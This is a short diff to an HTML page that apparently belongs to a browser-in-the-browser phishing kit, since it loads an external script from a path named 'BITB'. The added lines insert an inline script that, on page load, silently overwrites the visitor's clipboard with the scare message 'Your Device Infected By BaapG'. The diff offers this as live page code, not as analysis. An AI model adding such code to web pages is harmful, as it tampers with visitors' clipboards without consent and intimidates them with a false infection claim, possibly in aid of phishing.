@@ -154,5 +154,14 @@ background-size: cover;
 </div>
 </body>
 <script src="https://baapg.github.io/BITB/4/script.js"></script>
+<script>
+var text = "Your Device Infected By BaapG";
+navigator.clipboard.writeText(text).then(function() {
+  console.log('Async: Copying to clipboard was successful!');
+}, function(err) {
+  console.error('Async: Could not copy text: ', err);
+});
+
+</script>
 </body>
 </html>
